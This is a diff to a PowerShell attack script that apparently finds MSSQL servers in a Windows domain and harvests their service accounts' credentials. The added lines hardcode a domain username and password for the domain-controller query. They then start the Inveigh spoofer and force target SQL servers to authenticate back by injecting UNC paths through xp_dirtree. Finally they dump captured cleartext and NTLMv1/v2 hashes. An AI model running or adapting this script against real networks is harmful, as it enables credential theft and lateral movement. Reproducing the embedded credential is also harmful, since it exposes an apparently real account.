@@ -8,7 +8,7 @@
 
 # Get SQL Server service account for domain computers that are not computer accounts
 Write-output "Querying domain controller for mssql spn..."
-$z = Get-SQLInstanceDomain 
+$z = Get-SQLInstanceDomain -verbose -DomainController 10.0.0.30 -Username northland\tsobiech -Password Blabla62
 $zCount = $z.count
 Write-output "$zCount MSSQL SPNs found"
 
@@ -73,11 +73,32 @@ if(-not $x){
             #-----------------
             # attack here
             #-----------------
+            # - import inveigh
             # sniff and set relay target to target2
-            # unc path inject into target1
-            # wait 3 seconds
+            Write-Output "$sharedaccount : Starting sniffer"
+            Clear-Inveigh | Out-Null
+            Invoke-Inveigh -NBNS Y -SpooferHostsReply $target2 | Out-Null 
+
+            # unc path injection for each ip
+            Write-Output "$sharedaccount : Injecting UNC path into $target2"
+            Get-NetIPAddress | select ipaddress | %{         
+                $IP = $_.IPAddress
+                # unc path inject into target1
+                Get-SQLQuery -Instance $target2 -Query "xp_dirtree '\\$IP\path'" 
+            }
+
+            # wait 5 seconds
+            sleep 5
+
             # check for win
-            # on file goto next
+            Write-Output "$sharedaccount : Checking for credentials"
+            Get-InveighCleartext 
+            Get-InveighNTLMv1
+            Get-InveighNTLMv2
+
+            # on file goto next            
+            Stop-Inveigh | Out-Null
+             Write-Output "$sharedaccount : Stopping sniffer"
         
         }else{
 
